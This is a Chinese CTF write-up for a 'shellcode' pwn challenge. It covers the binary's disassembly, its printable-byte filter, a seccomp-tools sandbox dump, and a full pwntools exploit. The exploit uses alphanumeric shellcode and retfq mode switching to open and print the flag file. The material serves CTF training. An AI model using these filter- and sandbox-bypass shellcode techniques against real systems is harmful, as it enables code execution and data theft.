# SHELLCODE

题目提示:white_list 白名单，说明对输入数据有限制。

**审计**

这是一个汇编写的程序，使用mmap分配内存，之后使用read将输入读取到分配到内存中。其实就是让我们将程序写到mmap分配的内存，检测之后运行shellcode。

```asm
ext:00000000004001C5                 mov     edi, 3Ch        ; seconds
.text:00000000004001CA                 mov     eax, 25h
.text:00000000004001CF                 syscall                 ; LINUX - sys_alarm
.text:00000000004001D1                 mov     edx, 20h        ; count
.text:00000000004001D6                 lea     rsi, buf        ; "---------- Shellcode ----------\n"
.text:00000000004001DD                 mov     edi, 1          ; fd
.text:00000000004001E2                 mov     eax, 1
.text:00000000004001E7                 syscall                 ; LINUX - sys_write
.text:00000000004001E9                 mov     r8d, 0
.text:00000000004001EF                 mov     r10d, 0         ; arg4
.text:00000000004001F5                 mov     edx, 0          ; arg3
.text:00000000004001FA                 mov     esi, 1          ; arg2
.text:00000000004001FF                 mov     edi, 26h        ; option
.text:0000000000400204                 mov     eax, 0
.text:0000000000400209                 mov     eax, 9Dh
.text:000000000040020E                 syscall                 ; LINUX - sys_prctl
.text:0000000000400210                 lea     rax, [rbp+arg3]
.text:0000000000400214                 mov     rdx, rax        ; arg3
.text:0000000000400217                 mov     esi, 2          ; arg2
.text:000000000040021C                 mov     edi, 16h        ; option
.text:0000000000400221                 mov     eax, 0
.text:0000000000400226                 mov     eax, 9Dh
.text:000000000040022B                 syscall                 ; LINUX - sys_prctl
.text:000000000040022D                 mov     r9d, 0          ; off
.text:0000000000400233                 mov     r8d, 0FFFFFFFFh ; fd
.text:0000000000400239                 mov     r10d, 22h       ; flags
.text:000000000040023F                 mov     edx, 7          ; prot
.text:0000000000400244                 mov     esi, 1000h      ; len
.text:0000000000400249                 mov     edi, 0          ; addr
.text:000000000040024E                 mov     eax, 9
.text:0000000000400253                 syscall                 ; LINUX - sys_mmap
.text:0000000000400255                 mov     rbx, rax
.text:0000000000400258                 mov     edx, 16h        ; count
.text:000000000040025D                 lea     rsi, aInputYourShell ; "Input your shellcode: "
.text:0000000000400264                 mov     edi, 1          ; fd
.text:0000000000400269                 mov     eax, 1
.text:000000000040026E                 syscall                 ; LINUX - sys_write
.text:0000000000400270                 mov     edx, 1000h      ; count
.text:0000000000400275                 mov     rsi, rbx        ; buf
.text:0000000000400278                 mov     edi, 0          ; fd
.text:000000000040027D                 xor     eax, eax
.text:000000000040027F                 syscall                 ; LINUX - sys_read
```

MMAP分配的内存rwxp可执行

![xfgSQP](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/xfgSQP.png)



**call rbx**这个指令，即可执行我们的shellcode，我们要做的就是让程序跳转到0x4002E6,然后需要保证r13d和r12d相等就可以getshell了。

![OERzkU](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/OERzkU.png)

![pRLYMX](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/pRLYMX.png)

R12是read读取的返回值

R13是循环次数

重新看一下伪代码，就是要shellcode中间字符不得出现在0x1F和0x7F之间，否者程序会停止。每次循环R13都会+1.这样重要的就是检测shellcode的字符了，要保证shellcode的每一个字符都在1f和7f之间。也就是都是可见字符。

![eliwlu](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/eliwlu.png)

理论上只需要写入可见字符版本的shellcode就行了，在网上找了个ascii-shellcode,但是一直段错误，搞不明白。

```asm
shellcode = '''
    push 0x68                
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx                    
    push edx           

    /*构建int 80*/
    push 0x4f
    pop ecx
    push edx
    pop eax
    sub byte ptr[eax + 0x3a] , cl
    sub byte ptr[eax + 0x3a] , cl
    
    push 0x60       
    pop ecx  
    sub byte ptr[eax + 0x3b] , cl 
    sub byte ptr[eax + 0x3b] , cl
    
    /*构建完成 eax+0x39处为80cd(int 80)*/

    /*edx=0*/
    push 0x40
    pop eax
    xor al,0x40
    push eax
    pop edx

    /*eax=0xb*/
    xor al, 0x40
    xor al, 0x4b    

    /*补全shellcode长度，到rax+3a也就是shellcode+3a处*/
    push edx
    pop ecx
    push edx
    pop edx
    push edx
    pop edx
    push edx
    pop edx
    push edx
    pop edx
    push edx
    pop edx
'''

shellcode = asm(shellcode) + '\x6b\x40'
```

然后我找到了[WP](https://xz.aliyun.com/t/6645)...



**沙箱机制**

Seccomp沙箱机制参考这篇[文章](https://hitworld.github.io/posts/4b758b7f/),这种程序的特点一般是调用prctl来对系统调用进行限制。

使用seccomp-tools查看一下程序的沙盒规则，system被限制了，所以之前的shellcode都无法getshell。只能尝试cat flag然后打印出flag的值。

```
# seccomp-tools dump ./shellcode 
---------- Shellcode ----------
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008
 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008
 0003: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0008
 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008
 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008
 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

师傅们提供的思路

```
1、用可见字符编写shellcode 调用mmap申请地址，调用read读入32位shellcode
2、同时构造用retfq切换到32位模式，跳转到32位shellcode 位置
3、按照32位规则调用fp = open("flag")
4、保存open函数返回的fp指针，再次调用retfq切换回64模式，跳转到64位shellcode位置
5、执行read,write打印flag
```

EXP

```python
#coding:utf-8
from pwn import *
context.log_level = 'debug'
p = process('./shellcode')
# p = remote("nc.eonew.cn","10011")
p.recvuntil("shellcode: ")
append_x86 = '''
push ebx
pop ebx
'''
shellcode_x86 = '''
/*fp = open("flag")*/
mov esp,0x40404140
push 0x67616c66
push esp
pop ebx
xor ecx,ecx
mov eax,5
int 0x80
mov ecx,eax
'''
shellcode_flag = '''
push 0x33
push 0x40404089
retfq
/*read(fp,buf,0x70)*/
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall

/*write(1,buf,0x70)*/
mov rdi,1
mov rax,1
syscall
'''
shellcode_x86 = asm(shellcode_x86)
shellcode_flag = asm(shellcode_flag,arch = 'amd64',os = 'linux')
shellcode = ''
append = '''
push rdx
pop rdx
'''
# 0x40404040 为32位shellcode地址
shellcode_mmap = '''
/*mmap(0x40404040,0x7e,7,34,0,0)*/
push 0x40404040 /*set rdi*/
pop rdi

push 0x7e /*set rsi*/
pop rsi

push 0x40 /*set rdx*/
pop rax
xor al,0x47
push rax
pop rdx

push 0x40 /*set r8*/
pop rax
xor al,0x40
push rax
pop r8

push rax /*set r9*/
pop r9

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x31],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x32],cl

push 0x22 /*set rcx*/
pop rcx

push 0x40/*set rax*/
pop rax
xor al,0x49

'''
shellcode_read = '''
/*read(0,0x40404040,0x70)*/
push 0x40404040
pop rsi
push 0x40
pop rax
xor al,0x40
push rax
pop rdi
xor al,0x40
push 0x70
pop rdx
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x57],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x58],cl
push rdx
pop rax
xor al,0x70

'''

shellcode_retfq = '''
push rbx
pop rax

xor al,0x40

push 0x72
pop rcx
xor byte ptr[rax+0x40],cl
push 0x68
pop rcx
xor byte ptr[rax+0x40],cl
push 0x47
pop rcx
sub byte ptr[rax+0x41],cl
push 0x48
pop rcx
sub byte ptr[rax+0x41],cl
push rdi
push rdi
push 0x23
push 0x40404040
pop rax
push rax
'''

shellcode += shellcode_mmap
shellcode += append
shellcode += shellcode_read
shellcode += append

shellcode += shellcode_retfq
shellcode += append
shellcode = asm(shellcode,arch = 'amd64',os = 'linux')
print hex(len(shellcode))
# pause()
gdb.attach(p,"b *0x40027f\nb*0x4002eb\nc\nc\nsi\n")
p.sendline(shellcode)
pause()

p.sendline(shellcode_x86 + 0x29*'\x90' + shellcode_flag)
p.interactive()
```



打印出shellcode

![5oaXof](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/5oaXof.png)











参考网站 http://shell-storm.org/shellcode/

